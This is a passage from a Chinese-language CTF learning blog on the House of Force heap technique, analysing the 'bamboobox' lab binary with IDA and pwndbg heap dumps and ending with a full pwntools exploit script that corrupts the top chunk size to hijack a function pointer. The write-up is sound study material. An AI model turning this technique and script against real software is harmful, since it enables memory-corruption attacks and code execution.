<p>​	main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p>
<h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bamboobox Menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1.show the items in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2.add a new item"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3.change the item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4.remove the item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5.exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这是一个程序的菜单函数，没有什么特别的。</p>
<h3 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912091832878.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912091832878.png" alt="image-20230912091832878"></p>
<p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p>
<h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092037725.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092037725.png" alt="image-20230912092037725"></p>
<p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p>
<h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092541664.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092541664.png" alt="image-20230912092541664"></p>
<h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092703105.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092703105.png" alt="image-20230912092703105"></p>
<p>程序free的很干净，不存在uaf</p>
<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092723857.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092723857.png" alt="image-20230912092723857"></p>
<p>目标地址，控制程序执行流到magic函数的位置即可get flag</p>
<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092850070.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092850070.png" alt="image-20230912092850070"></p>
<p>对应c代码的 item 结构体</p>
<h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p>
<ul>
<li>chunk0:size=10，content=”aaaaa”</li>
<li>chunk1:size=20，content=”bbbbb”</li>
</ul>
<pre class=" language-c"><code class="language-c">giantbranch@ubuntu<span class="token punctuation">:</span><span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>PWN题<span class="token operator">/</span>Range<span class="token operator">/</span>ctfshow<span class="token operator">/</span>ctf<span class="token operator">-</span>pwn<span class="token operator">-</span>challenges<span class="token operator">/</span>heap<span class="token operator">/</span>house<span class="token operator">-</span>of<span class="token operator">-</span>force<span class="token operator">/</span>hitcontrani
ng_lab11$ gdb bamboobox
GNU <span class="token function">gdb</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">7.11</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">-</span>0ubuntu1<span class="token operator">~</span><span class="token number">16.5</span><span class="token punctuation">)</span> <span class="token number">7.11</span><span class="token punctuation">.</span><span class="token number">1</span>
<span class="token function">Copyright</span> <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2016</span> Free Software Foundation<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
License GPLv3<span class="token operator">+</span><span class="token punctuation">:</span> GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>gnu<span class="token punctuation">.</span>org<span class="token operator">/</span>licenses<span class="token operator">/</span>gpl<span class="token punctuation">.</span>html<span class="token operator">></span>
This is free software<span class="token punctuation">:</span> you are free to change and redistribute it<span class="token punctuation">.</span>
There is NO WARRANTY<span class="token punctuation">,</span> to the extent permitted by law<span class="token punctuation">.</span>  Type <span class="token string">"show copying"</span>
and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details<span class="token punctuation">.</span>
This GDB was configured as <span class="token string">"x86_64-linux-gnu"</span><span class="token punctuation">.</span>
Type <span class="token string">"show configuration"</span> <span class="token keyword">for</span> configuration details<span class="token punctuation">.</span>
For bug reporting instructions<span class="token punctuation">,</span> please see<span class="token punctuation">:</span>
<span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>gnu<span class="token punctuation">.</span>org<span class="token operator">/</span>software<span class="token operator">/</span>gdb<span class="token operator">/</span>bugs<span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">.</span>
Find the GDB manual and other documentation resources online at<span class="token punctuation">:</span>
<span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>gnu<span class="token punctuation">.</span>org<span class="token operator">/</span>software<span class="token operator">/</span>gdb<span class="token operator">/</span>documentation<span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">.</span>
For help<span class="token punctuation">,</span> type <span class="token string">"help"</span><span class="token punctuation">.</span>
Type <span class="token string">"apropos word"</span> to search <span class="token keyword">for</span> commands related to <span class="token string">"word"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
pwndbg<span class="token punctuation">:</span> loaded <span class="token number">175</span> commands<span class="token punctuation">.</span> Type pwndbg <span class="token punctuation">[</span>filter<span class="token punctuation">]</span> <span class="token keyword">for</span> a list<span class="token punctuation">.</span>
pwndbg<span class="token punctuation">:</span> created $rebase<span class="token punctuation">,</span> $ida gdb <span class="token function">functions</span> <span class="token punctuation">(</span>can be used with print<span class="token operator">/</span><span class="token keyword">break</span><span class="token punctuation">)</span>
Reading symbols from bamboobox<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>done<span class="token punctuation">.</span>
pwndbg<span class="token operator">></span> r
Starting program<span class="token punctuation">:</span> <span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>PWN题<span class="token operator">/</span>Range<span class="token operator">/</span>ctfshow<span class="token operator">/</span>ctf<span class="token operator">-</span>pwn<span class="token operator">-</span>challenges<span class="token operator">/</span>heap<span class="token operator">/</span>house<span class="token operator">-</span>of<span class="token operator">-</span>force<span class="token operator">/</span>hitcontraning_lab11<span class="token operator">/</span>bamboobox 
There is a box with magic
what <span class="token keyword">do</span> you want to <span class="token keyword">do</span> in the box
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Bamboobox Menu
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token number">1</span><span class="token punctuation">.</span>show the items in the box
<span class="token number">2</span><span class="token punctuation">.</span>add a new item
<span class="token number">3</span><span class="token punctuation">.</span>change the item in the box
<span class="token number">4</span><span class="token punctuation">.</span>remove the item in the box
<span class="token number">5</span><span class="token punctuation">.</span>exit
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Your choice<span class="token punctuation">:</span><span class="token number">2</span>
Please enter the length of item name<span class="token punctuation">:</span><span class="token number">10</span>
Please enter the name of item<span class="token punctuation">:</span>aaaaa
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Bamboobox Menu
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token number">1</span><span class="token punctuation">.</span>show the items in the box
<span class="token number">2</span><span class="token punctuation">.</span>add a new item
<span class="token number">3</span><span class="token punctuation">.</span>change the item in the box
<span class="token number">4</span><span class="token punctuation">.</span>remove the item in the box
<span class="token number">5</span><span class="token punctuation">.</span>exit
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Your choice<span class="token punctuation">:</span><span class="token number">2</span>
Please enter the length of item name<span class="token punctuation">:</span><span class="token number">20</span>
Please enter the name of item<span class="token punctuation">:</span>bbbbb
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Bamboobox Menu
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token number">1</span><span class="token punctuation">.</span>show the items in the box
<span class="token number">2</span><span class="token punctuation">.</span>add a new item
<span class="token number">3</span><span class="token punctuation">.</span>change the item in the box
<span class="token number">4</span><span class="token punctuation">.</span>remove the item in the box
<span class="token number">5</span><span class="token punctuation">.</span>exit
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Your choice<span class="token punctuation">:</span><span class="token operator">^</span>C
Program received signal SIGINT<span class="token punctuation">,</span> Interrupt<span class="token punctuation">.</span>
<span class="token number">0x00007ffff7b04360</span> in <span class="token function">__read_nocancel</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token punctuation">:</span><span class="token number">84</span>
<span class="token number">84</span>	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token punctuation">:</span> No such file or directory<span class="token punctuation">.</span>
LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
───────────────────────────────────────────<span class="token punctuation">[</span> REGISTERS <span class="token punctuation">]</span>───────────────────────────────────────────
 RAX  <span class="token number">0xfffffffffffffe00</span>
 RBX  <span class="token number">0x0</span>
 RCX  <span class="token function">0x7ffff7b04360</span> <span class="token punctuation">(</span>__read_nocancel<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span> ◂— cmp    rax<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0xfff</span>
 RDX  <span class="token number">0x8</span>
 RDI  <span class="token number">0x0</span>
 RSI  <span class="token number">0x7fffffffdc40</span> —▸ <span class="token number">0x7fffffff0a32</span> ◂— <span class="token number">0x0</span>
 R8   <span class="token number">0x7ffff7fdd700</span> ◂— <span class="token number">0x7ffff7fdd700</span>
 R9   <span class="token number">0xc</span>
 R10  <span class="token number">0x0</span>
 R11  <span class="token number">0x246</span>
 R12  <span class="token function">0x4007a0</span> <span class="token punctuation">(</span>_start<span class="token punctuation">)</span> ◂— xor    ebp<span class="token punctuation">,</span> ebp
 R13  <span class="token number">0x7fffffffdd30</span> ◂— <span class="token number">0x1</span>
 R14  <span class="token number">0x0</span>
 R15  <span class="token number">0x0</span>
 RBP  <span class="token number">0x7fffffffdc50</span> —▸ <span class="token function">0x400ee0</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15
 RSP  <span class="token number">0x7fffffffdc28</span> —▸ <span class="token function">0x400e5d</span> <span class="token punctuation">(</span>main<span class="token operator">+</span><span class="token number">166</span><span class="token punctuation">)</span> ◂— lea    rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">]</span>
 RIP  <span class="token function">0x7ffff7b04360</span> <span class="token punctuation">(</span>__read_nocancel<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span> ◂— cmp    rax<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0xfff</span>
────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>─────────────────────────────────────────────
 ► <span class="token number">0x7ffff7b04360</span> <span class="token operator">&lt;</span>__read_nocancel<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span>     cmp    rax<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0xfff</span>
   <span class="token number">0x7ffff7b04366</span> <span class="token operator">&lt;</span>__read_nocancel<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span>    jae    read<span class="token operator">+</span><span class="token number">73</span> <span class="token operator">&lt;</span><span class="token number">0x7ffff7b04399</span><span class="token operator">></span>
    ↓
   <span class="token number">0x7ffff7b04399</span> <span class="token operator">&lt;</span>read<span class="token operator">+</span><span class="token number">73</span><span class="token operator">></span>               mov    rcx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0x2ccad8</span><span class="token punctuation">]</span>
   <span class="token number">0x7ffff7b043a0</span> <span class="token operator">&lt;</span>read<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span>               neg    eax
   <span class="token number">0x7ffff7b043a2</span> <span class="token operator">&lt;</span>read<span class="token operator">+</span><span class="token number">82</span><span class="token operator">></span>               mov    dword ptr fs<span class="token punctuation">:</span><span class="token punctuation">[</span>rcx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax
   <span class="token number">0x7ffff7b043a5</span> <span class="token operator">&lt;</span>read<span class="token operator">+</span><span class="token number">85</span><span class="token operator">></span>               or     rax<span class="token punctuation">,</span> <span class="token number">0xffffffffffffffff</span>
   <span class="token number">0x7ffff7b043a9</span> <span class="token operator">&lt;</span>read<span class="token operator">+</span><span class="token number">89</span><span class="token operator">></span>               ret    
 
   <span class="token number">0x7ffff7b043aa</span>                         nop    word ptr <span class="token punctuation">[</span>rax <span class="token operator">+</span> rax<span class="token punctuation">]</span>
   <span class="token number">0x7ffff7b043b0</span> <span class="token operator">&lt;</span>write<span class="token operator">></span>                 cmp    dword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0x2d2389</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token operator">&lt;</span><span class="token number">0x7ffff7dd6740</span><span class="token operator">></span>
   <span class="token number">0x7ffff7b043b7</span> <span class="token operator">&lt;</span>write<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span>               jne    write<span class="token operator">+</span><span class="token number">25</span> <span class="token operator">&lt;</span><span class="token number">0x7ffff7b043c9</span><span class="token operator">></span>
    ↓
   <span class="token number">0x7ffff7b043c9</span> <span class="token operator">&lt;</span>write<span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span>              sub    rsp<span class="token punctuation">,</span> <span class="token number">8</span>
─────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>─────────────────────────────────────────────
<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdc28</span> —▸ <span class="token function">0x400e5d</span> <span class="token punctuation">(</span>main<span class="token operator">+</span><span class="token number">166</span><span class="token punctuation">)</span> ◂— lea    rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">]</span>
<span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdc30</span> ◂— <span class="token number">0x200400ee0</span>
<span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffdc38</span> —▸ <span class="token number">0x603010</span> —▸ <span class="token function">0x400896</span> <span class="token punctuation">(</span>hello_message<span class="token punctuation">)</span> ◂— push   rbp
<span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>│ rsi  <span class="token number">0x7fffffffdc40</span> —▸ <span class="token number">0x7fffffff0a32</span> ◂— <span class="token number">0x0</span>
<span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdc48</span> ◂— <span class="token number">0x2b1241ff949c6b00</span>
<span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>│ rbp  <span class="token number">0x7fffffffdc50</span> —▸ <span class="token function">0x400ee0</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15
<span class="token number">06</span><span class="token punctuation">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdc58</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax
<span class="token number">07</span><span class="token punctuation">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdc60</span> ◂— <span class="token number">0x0</span>
───────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>───────────────────────────────────────────
 ► f <span class="token number">0</span>     7ffff7b04360 __read_nocancel<span class="token operator">+</span><span class="token number">7</span>
   f <span class="token number">1</span>           400e5d main<span class="token operator">+</span><span class="token number">166</span>
   f <span class="token number">2</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>
Program received signal SIGINT
pwndbg<span class="token operator">></span> 
</code></pre>
<p>ok，输入完成，接下来我们查看堆的分布</p>
<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> heap
Allocated chunk <span class="token operator">|</span> PREV_INUSE
Addr<span class="token punctuation">:</span> <span class="token number">0x603000</span>
Size<span class="token punctuation">:</span> <span class="token number">0x21</span>

Allocated chunk <span class="token operator">|</span> PREV_INUSE
Addr<span class="token punctuation">:</span> <span class="token number">0x603020</span>
Size<span class="token punctuation">:</span> <span class="token number">0x21</span>

Allocated chunk <span class="token operator">|</span> PREV_INUSE
Addr<span class="token punctuation">:</span> <span class="token number">0x603040</span>
Size<span class="token punctuation">:</span> <span class="token number">0x21</span>

Top chunk <span class="token operator">|</span> PREV_INUSE
Addr<span class="token punctuation">:</span> <span class="token number">0x603060</span>
Size<span class="token punctuation">:</span> <span class="token number">0x20fa1</span>

pwndbg<span class="token operator">></span> 
</code></pre>
<p>堆的内存分布</p>
<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>30gx <span class="token number">0x603000</span>
<span class="token number">0x603000</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000021</span> #func_start_malloc_chunk
<span class="token number">0x603010</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000400896</span>	<span class="token number">0x00000000004008b1</span>
                    <span class="token macro property">#hello_message      #goodbye_message</span>
<span class="token number">0x603020</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000021</span> #chunk0
<span class="token number">0x603030</span><span class="token punctuation">:</span>	<span class="token number">0x00000a6161616161</span>	<span class="token number">0x0000000000000000</span>
<span class="token number">0x603040</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000021</span> #chunk1
<span class="token number">0x603050</span><span class="token punctuation">:</span>	<span class="token number">0x00000a6262626262</span>	<span class="token number">0x0000000000000000</span>
<span class="token number">0x603060</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000020fa1</span> #top_chunk
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>省略内容均为空<span class="token punctuation">)</span>
<span class="token number">0x6030e0</span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000000</span>
pwndbg<span class="token operator">></span> 
</code></pre>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093548094.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093548094.png" alt="image-20230912093548094"></p>
<p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093439237.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093439237.png" alt="image-20230912093439237"></p>
<ul>
<li>num记录着堆块的数量。</li>
</ul>
<p>查看一下堆指针信息</p>
<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10gx <span class="token number">0x6020c0</span>
<span class="token number">0x6020c0</span> <span class="token operator">&lt;</span>itemlist<span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">0x000000000000000a</span>	<span class="token number">0x0000000000603030</span> #chunk0
                        <span class="token macro property">#struct_size        #struct_content_ptr</span>
<span class="token number">0x6020d0</span> <span class="token operator">&lt;</span>itemlist<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000014</span>	<span class="token number">0x0000000000603050</span> #chunk1
                        <span class="token macro property">#struct_size        #struct_content_ptr</span>
<span class="token number">0x6020e0</span> <span class="token operator">&lt;</span>itemlist<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000000</span>
<span class="token number">0x6020f0</span> <span class="token operator">&lt;</span>itemlist<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000000</span>
<span class="token number">0x602100</span> <span class="token operator">&lt;</span>itemlist<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">0x0000000000000000</span>	<span class="token number">0x0000000000000000</span>
pwndbg<span class="token operator">></span> 
<span class="token comment" spellcheck="true">//注意struct_content_ptr指向malloc出来malloc_data的地址</span>
</code></pre>
<h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><pre class=" language-py"><code class="language-py">#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./bamboobox')

def cmd(choice):
  p.sendlineafter('',str(choice))
  
def create(size,content):
  cmd(2)
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('item:',content)

def edit(index,size,content):
  cmd(3)
  p.sendlineafter('of item:',str(index))
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('the item:',content)

def delete(index):
  cmd(4)
  p.sendlineafter('of item:',str(index))

def quit():
  cmd(5)

magic = 0x400d49
create(0x30, "aaaa")
content='a'*0x30+'1'*8+p64(0xffffffffffffffff)
edit(0,0x40,content)
offset=-0x60-0x10
create(offset,'bbbb')
create(0x10,p64(magic)*2)
quit()
p.interactive()
</code></pre>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Einherjar/">House of Einherjar Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%883-12-1%EF%BC%89-House-Of-Force%EF%BC%88%E6%8E%A7%E5%88%B6top-chunk%EF%BC%89%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">Linux环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81-c"><span class="toc-number">1.2.</span> <span class="toc-text">程序的源代码(c)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meau%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">meau函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-item"><span class="toc-number">1.3.3.</span> <span class="toc-text">show_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-item"><span class="toc-number">1.3.4.</span> <span class="toc-text">add_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change-item"><span class="toc-number">1.3.5.</span> <span class="toc-text">change_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#remove-item"><span class="toc-number">1.3.6.</span> <span class="toc-text">remove_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic"><span class="toc-number">1.3.7.</span> <span class="toc-text">magic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.3.8.</span> <span class="toc-text">结构体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">pwndbg 动态调试</span></a><ol 